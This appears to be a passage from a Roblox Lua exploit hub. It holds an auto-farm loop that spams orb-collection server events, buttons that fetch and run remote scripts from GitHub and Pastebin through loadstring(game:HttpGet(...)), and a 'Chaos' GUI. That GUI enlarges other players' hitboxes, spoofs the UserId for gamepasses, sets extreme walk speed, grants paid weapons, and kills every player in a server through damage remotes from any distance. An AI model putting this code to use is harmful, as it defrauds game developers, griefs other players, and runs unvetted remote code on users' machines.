= "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

end)




local Section = Tab:NewSection("UnderGround War")
Section:NewButton("UnderGround Gui 1 ", "New ok", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/UniqueHub/main/UniqueHubv2Intro', true))()
end)
Section:NewButton("UnderGround Gui 2 ", "New ok", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/multi-hub/main/Multi",true))()
end)
Section:NewButton("UnderGround Gui 3 ", "New ok", function()
loadstring(game:HttpGet("https://pastebin.com/raw/iuqYjEAX"))()
end)

Section:NewButton("UnderGround Gui 1 ", "idk im bored", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/The%20UnderGround%20War%203'))()
end)



local Section = Tab:NewSection("Castle War")
Section:NewButton("Castle War Gui 1 ", "New ok", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Castle%20Wars'))()
end)



local Section = Tab:NewSection("Chaos")
Section:NewButton("Chaos Gui 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Idkwhatudoin/TSS/main/TSSChaosScript", true))()
end)
Section:NewButton("Chaos Gui 2 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/aidanlolol/MainScript/main/ChaosScriptVersionTwoPointOne.lua"))()
end)
Section:NewButton("Chaos Gui 3 ", "", function()
loadstring(game:HttpGet("https://pastebin.com/raw/VzPbD7GW"))()
end)

Section:NewButton("Chaos Gui 1 ", "", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/1111-ssss/Chaos_Script/main/Chaos_script.txt'))()
end)

Section:NewButton("Chaos Gui 2 ", "idk ok", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextButton_9 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local TextButton_10 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local TextButton_11 = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local TextButton_12 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local UICorner_15 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(54, 65, 68)
Frame.BorderSizePixel = 3
Frame.Position = UDim2.new(0.211394295, 0, 0.181333318, 0)
Frame.Size = UDim2.new(0, 384, 0, 238)
Frame.Active = true
Frame.Draggable = true

UICorner.Parent = Frame

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
TextLabel.Size = UDim2.new(0, 384, 0, 34)
TextLabel.Font = Enum.Font.Bangers
TextLabel.Text = "Chaos Script"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 28.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(38, 136, 54)
TextLabel.TextStrokeTransparency = 0.850
TextLabel.TextWrapped = true

UICorner_2.Parent = TextLabel

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton.Position = UDim2.new(0.018229166, 0, 0.176470593, 0)
TextButton.Size = UDim2.new(0, 107, 0, 26)
TextButton.Font = Enum.Font.Bangers
TextButton.Text = "Old Version"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
TextButton.MouseButton1Down:Connect(function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Hitbox = Instance.new("TextButton")
local Gamepass = Instance.new("TextButton")
local fly = Instance.new("TextButton")
local speedsonic = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
Frame.Position = UDim2.new(0.218826383, 0, 0.14314115, 0)
Frame.Size = UDim2.new(0, 438, 0, 277)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Size = UDim2.new(0, 438, 0, 35)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Chaos Gui Script"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 26.000
TextLabel.TextWrapped = true

Hitbox.Name = "Hitbox"
Hitbox.Parent = Frame
Hitbox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hitbox.Position = UDim2.new(0.0547945164, 0, 0.193650797, 0)
Hitbox.Size = UDim2.new(0, 164, 0, 50)
Hitbox.Font = Enum.Font.SourceSansBold
Hitbox.Text = "HITBOX"
Hitbox.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitbox.TextScaled = true
Hitbox.TextSize = 14.000
Hitbox.TextWrapped = true
Hitbox.MouseButton1Down:connect(function()
	_G.HeadSize = 20
	_G.Disabled = true

	game:GetService('RunService').RenderStepped:connect(function()
		if _G.Disabled then
			for i,v in next, game:GetService('Players'):GetPlayers() do
				if v.Name ~= game:GetService('Players').LocalPlayer.Name then
					pcall(function()
						v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
						v.Character.HumanoidRootPart.Transparency = 0.7
						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
						v.Character.HumanoidRootPart.Material = "Neon"
						v.Character.HumanoidRootPart.CanCollide = false
					end)
				end
			end
		end
	end)
end)

Gamepass.Name = "Gamepass"
Gamepass.Parent = Frame
Gamepass.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Gamepass.Position = UDim2.new(0.570776224, 0, 0.193650797, 0)
Gamepass.Size = UDim2.new(0, 164, 0, 50)
Gamepass.Font = Enum.Font.SourceSansBold
Gamepass.Text = "FREE GAMEPASS!!!!"
Gamepass.TextColor3 = Color3.fromRGB(255, 255, 255)
Gamepass.TextScaled = true
Gamepass.TextSize = 14.000
Gamepass.TextWrapped = true
Gamepass.MouseButton1Down:connect(function()
	if game.CreatorType == Enum.CreatorType.User then
		game.Players.LocalPlayer.UserId = game.CreatorId
	end
	if game.CreatorType == Enum.CreatorType.Group then
		game.Players.LocalPlayer.UserId = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id
	end
end)

fly.Name = "fly (patched)"
fly.Parent = Frame
fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fly.Position = UDim2.new(0.0547944903, 0, 0.596825421, 0)
fly.Size = UDim2.new(0, 164, 0, 50)
fly.Font = Enum.Font.SourceSansBold
fly.Text = "Fly Press (E)"
fly.TextColor3 = Color3.fromRGB(255, 255, 255)
fly.TextScaled = true
fly.TextSize = 14.000
fly.TextWrapped = true
fly.MouseButton1Down:connect(function()
	-- Press "E" to fly and unfly
	-- You have to re-apply the script if you die
	loadstring(game:HttpGet("https://pastebin.com/raw/7rXZ9VNc", true))()
end)

speedsonic.Name = "speed sonic"
speedsonic.Parent = Frame
speedsonic.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
speedsonic.Position = UDim2.new(0.570776224, 0, 0.596825421, 0)
speedsonic.Size = UDim2.new(0, 164, 0, 50)
speedsonic.Font = Enum.Font.SourceSansBold
speedsonic.Text = "Speed"
speedsonic.TextColor3 = Color3.fromRGB(255, 255, 255)
speedsonic.TextScaled = true
speedsonic.TextSize = 14.000
speedsonic.TextWrapped = true
speedsonic.MouseButton1Down:connect(function()
	speed = 1500 --16 is default

	function onPlayerRespawned(character)
		wait(1) --loading delay
		local player = game.Players:GetPlayerFromCharacter(character)
		local human = character:findFirstChild("Humanoid")
		if player ~= nil and human ~= nil then
			human.WalkSpeed = speed
		end
	end

	game.Workspace.ChildAdded:connect(onPlayerRespawned)
end)

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.Position = UDim2.new(0, 0, 0.87189275, 0)
TextLabel_2.Size = UDim2.new(0, 438, 0, 35)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "Script Made By JJspolit93s"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 26.000
TextLabel_2.TextWrapped = true
end)

UICorner_3.Parent = TextButton

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_2.Position = UDim2.new(0.359375, 0, 0.176470593, 0)
TextButton_2.Size = UDim2.new(0, 107, 0, 26)
TextButton_2.Font = Enum.Font.Bangers
TextButton_2.Text = "Original Version"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 14.000
TextButton_2.MouseButton1Down:Connect(function()
local function Create(Object, Properties)
	local New = Instance.new(Object)
	for i,v in pairs(Properties) do
		New[i] = v
	end
	return New
end

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local Gui = Create("ScreenGui",{Name="MXscript",ResetOnSpawn=false,Parent=Player.PlayerGui})
local Frame = Create("Frame",{Parent=Gui,Position = UDim2.new(0.4,0,0.4,0),Size=UDim2.new(0.2,0,0.2,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=0})
local Title = Create("TextLabel",{Parent=Frame,Position=UDim2.new(0.3,0,-0.15,-1),Size=UDim2.new(0.4,0,0.15,0),Font=Enum.Font.Oswald,Text="MXscript",BorderSizePixel=3,TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(8,3,7),ZIndex=100})
local OutlineU = Create("Frame",{Parent=Frame,Position = UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.01,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=100})
local OutlineD = Create("Frame",{Parent=Frame,Position = UDim2.new(0,0,1,0),Size=UDim2.new(1,0,0.01,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=100})
local OutlineL = Create("Frame",{Parent=Frame,Position = UDim2.new(0,0,0,0),Size=UDim2.new(0.005,0,1,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=100})
local OutlineR = Create("Frame",{Parent=Frame,Position = UDim2.new(1,0,0,0),Size=UDim2.new(0.005,0,1,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=100})

local InfoText = Create("TextLabel",{Parent=Gui,Position=UDim2.new(0,0,0,0),Size=UDim2.new(0.1,0,0.1,0),BackgroundTransparency=0,BackgroundColor3=Color3.new(0,0,0),Font=Enum.Font.Oswald,Text="Weapons",TextColor3=Color3.new(0,0,0),TextStrokeTransparency=10,TextScaled=true,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Top,Visible=false,ZIndex=15})

local GiveGS = Create("TextButton",{Name="GiveGS",Parent=Frame,Position=UDim2.new(0.05,0,0.3,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="SD",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local GiveBD = Create("TextButton",{Name="GiveBD",Parent=Frame,Position=UDim2.new(0.05,0,0.5,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="BD",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local SpamTools = Create("TextButton",{Name="SpamTools",Parent=Frame,Position=UDim2.new(0.05,0,0.7,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="STools",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local KillNear = Create("TextButton",{Name="KillNear",Parent=Frame,Position=UDim2.new(0.6,0,0.3,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="KNear",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local SpamGrenades = Create("TextButton",{Name="C4/Grenades",Parent=Frame,Position=UDim2.new(0.6,0,0.5,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="C4/GR",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local FastKill = Create("TextButton",{Name="FastKill",Parent=Frame,Position=UDim2.new(0.6,0,0.7,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="FKAll",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local RSpam = Create("TextButton",{Name="RSpam",Parent=Frame,Position=UDim2.new(0.6,0,0.9,0),Size=UDim2.new(0.3,0,0.14,0),Font=Enum.Font.Oswald,Text="RSpam",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local SSpiked = Create("TextButton",{Name="SSpiked",Parent=Frame,Position=UDim2.new(0.05,0,0.9,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="SSpiked",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local InfDash = Create("TextButton",{Name="InfDash",Parent=Frame,Position=UDim2.new(0.05,0,0.07,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="InfDash",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})
local Pan = Create("TextButton",{Name="Pan",Parent=Frame,Position=UDim2.new(0.6,0,0.07,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Pan",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=0})

local ButtonInfo = {
    GiveGS = "Gives gamepass Emerald Greatsword weapon for free",
    GiveBD = "Gives gamepass Blood Dagger weapon for free",
    SpamTools = "Rapidly gives you multiple tools, use when combined with Spam Grenades",
    KillNear = "WHILE HOLDING OUT A WEAPON, damages the closest player from any distance",
    SpamGrenades = "Automatically throws grenades incredibly fast, use with Spam Tools to refresh grenades",
    FastKill = "Uses all weapons to kill everybody in the server. Give yourself more tools for faster killing"
}

local function GetChar()
    local Char = Player.Character or Player.CharacterAdded:Wait()
    return Char
end

local DragSpeed = .3
local FrameStart
local MouseStart
local HeldDown = false
Title.InputBegan:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton1 then
		HeldDown = true
		FrameStart = Frame.Position
		MouseStart = Input.Position
		repeat
			Frame.Position = Frame.Position:Lerp(UDim2.new(FrameStart.X.Scale,FrameStart.X.Offset + (Mouse.X - MouseStart.X),FrameStart.Y.Scale,FrameStart.Y.Offset + (Mouse.Y - MouseStart.Y)), DragSpeed)
			game:GetService("RunService").RenderStepped:Wait()
		until not HeldDown
		local EndPos = {X = Mouse.X, Y = Mouse.Y}
		for i=1,50 do
			if not HeldDown then
				Frame.Position = Frame.Position:Lerp(UDim2.new(FrameStart.X.Scale,FrameStart.X.Offset + (EndPos.X - MouseStart.X),FrameStart.Y.Scale,FrameStart.Y.Offset + (EndPos.Y - MouseStart.Y)), DragSpeed)
			else
				break
			end
			game:GetService("RunService").RenderStepped:Wait()
		end
	end
end)

Title.InputEnded:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton1 then
		HeldDown = false
	end
end)

Pan.MouseButton1Click:Connect(function()
    if Player.Character:FindFirstChild("Loaded") then Player.Character.Loaded:Destroy() end
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Pan")
end)

GiveGS.MouseButton1Click:Connect(function()
    if Player.Character:FindFirstChild("Loaded") then Player.Character.Loaded:Destroy() end
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Emerald Greatsword")
end)

GiveBD.MouseButton1Click:Connect(function()
    if Player.Character:FindFirstChild("Loaded") then Player.Character.Loaded:Destroy() end
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Blood Dagger")
end)

local Spamming = false
SpamTools.MouseButton1Click:Connect(function()
    if Spamming then
        Spamming = false
        SpamTools.BackgroundColor3 = Color3.new(1,1,1)
    else
        SpamTools.BackgroundColor3 = Color3.new(0,1,0)
        Spamming = true
        repeat
            if GetChar():FindFirstChild("Loaded") then
                GetChar().Loaded:Destroy()
            end
            Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Chainsaw")
            game:GetService("RunService").Heartbeat:Wait()
        until not Spamming
    end
end)

local KillingNear = false
KillNear.MouseButton1Click:Connect(function()
    if KillingNear then
        KillingNear = false
        KillNear.BackgroundColor3 = Color3.new(1,1,1)
    else
        KillNear.BackgroundColor3 = Color3.new(0,1,0)
        KillingNear = true
        repeat
            local targ
            local range = 10000
            for i,v in pairs(workspace:GetChildren()) do
                if v~=GetChar() and not table.find(_G.IgnoreList,v.Name) then
                    local vhum = v:FindFirstChild("Humanoid")
                    local vroot = v:FindFirstChild("HumanoidRootPart")
                    if vhum and vroot then
                        local dist = (vroot.Position - Player.Character.HumanoidRootPart.Position).magnitude
                        if vhum.Health>0 and not v:FindFirstChild("ForceField") and dist <= range then
                            targ = vhum
                            range = dist
                        end
                    end
                end
            end
            
            if targ then
                local tool = GetChar():FindFirstChildOfClass("Tool")
                tool.DamageRemote:FireServer(targ)
            end
            wait()
        until not KillingNear
    end
end)

local Grenading = false
RSpam.MouseButton1Click:Connect(function()
    if Grenading then
        Grenading = false
        RSpam.BackgroundColor3 = Color3.new(1,1,1)
    else
        RSpam.BackgroundColor3 = Color3.new(0,1,0)
        Grenading = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v.Name == "Kawaii Revolver" then
                    GetChar().Humanoid:EquipTool(v)
                    v:Activate()
                    for i=1,2 do
                        game:GetService("RunService").Heartbeat:Wait()
                        break
                    end
                end
            end
            game:GetService("RunService").Heartbeat:Wait()
        until not Grenading
    end
end)

InfDash.MouseButton1Click:Connect(function()
	originalfunction = hookfunction(wait, function(seconds)
		if seconds == 2 then return end
		return originalfunction(seconds)
	end)
end)

local Grenading = false
SpamGrenades.MouseButton1Click:Connect(function()
    if Grenading then
        Grenading = false
        SpamGrenades.BackgroundColor3 = Color3.new(1,1,1)
    else
        SpamGrenades.BackgroundColor3 = Color3.new(0,1,0)
        Grenading = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v.Name == "Grenade" then
                    GetChar().Humanoid:EquipTool(v)
                    v:Activate()
                    for i=1,5 do
                        game:GetService("RunService").Heartbeat:Wait()
                        break
                    end
                end
            end
            game:GetService("RunService").Heartbeat:Wait()
        until not Grenading
    end
end)

local Grenading = false
SSpiked.MouseButton1Click:Connect(function()
    if Grenading then
        Grenading = false
        SSpiked.BackgroundColor3 = Color3.new(1,1,1)
    else
        SSpiked.BackgroundColor3 = Color3.new(0,1,0)
        Grenading = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v.Name == "Spiked Trap" then
                    GetChar().Humanoid:EquipTool(v)
                    v:Activate()
                    for i=1,5 do
                        game:GetService("RunService").Heartbeat:Wait()
                        break
                    end
                end
            end
            game:GetService("RunService").Heartbeat:Wait()
        until not Grenading
    end
end)

local Grenading = false
SpamGrenades.MouseButton1Click:Connect(function()
    if Grenading then
        Grenading = false
        SpamGrenades.BackgroundColor3 = Color3.new(1,1,1)
    else
        SpamGrenades.BackgroundColor3 = Color3.new(0,1,0)
        Grenading = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v.Name == "C4" then
                    GetChar().Humanoid:EquipTool(v)
                    v:Activate()
                    for i=1,5 do
                        game:GetService("RunService").Heartbeat:Wait()
                    end
                    if not Grenading then
                        break
                    end
                end
            end
            game:GetService("RunService").Heartbeat:Wait()
        until not Grenading
    end
end)

local FastKilling = false
FastKill.MouseButton1Click:Connect(function()
    if FastKilling then
        FastKilling = false
        FastKill.BackgroundColor3 = Color3.new(1,1,1)
    else
        FastKill.BackgroundColor3 = Color3.new(0,1,0)
        FastKilling = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v:FindFirstChild("DamageRemote") then
                    GetChar().Humanoid:EquipTool(v)
                    
                    local targ
                    local range = 10000
                    for i,v in pairs(workspace:GetChildren()) do
                        if v~=GetChar() and not table.find(_G.IgnoreList,v.Name) then
                            local vhum = v:FindFirstChild("Humanoid")
                            local vroot = v:FindFirstChild("HumanoidRootPart")
                            if vhum and vroot then
                                local dist = (vroot.Position - Player.Character.HumanoidRootPart.Position).magnitude
                                if vhum.Health>0 and not v:FindFirstChild("ForceField") and dist <= range then
                                    targ = vhum
                                    range = dist
                                end
                            end
                        end
                    end
                    
                    for i=1,2 do
                        game:GetService("RunService").Heartbeat:Wait()
                    end
                    
                    if targ then
                        v.DamageRemote:FireServer(targ)
                    end
                    
                    if not FastKilling then
                        break
                    end
                end
            end
            wait()
        until not FastKilling
    end
end)

for name,info in pairs(ButtonInfo) do
    local button = Frame[name]
    button.MouseEnter:Connect(function()
    	local left = false
    	local con = button.MouseLeave:Connect(function()
    		left = true
    	end)
    	
    	InfoText.Visible = true
    	InfoText.Text = info
    	
    	repeat
    		game:GetService("RunService").RenderStepped:Wait()
    		InfoText.Position = UDim2.new(0,Mouse.X+5,0,Mouse.Y+5)
    	until left
    	InfoText.Visible = false
    	con:Disconnect()
    end)
end
end)

UICorner_4.Parent = TextButton_2

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_3.Position = UDim2.new(0.690104127, 0, 0.176470593, 0)
TextButton_3.Size = UDim2.new(0, 107, 0, 26)
TextButton_3.Font = Enum.Font.Bangers
TextButton_3.Text = "NEW version"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000
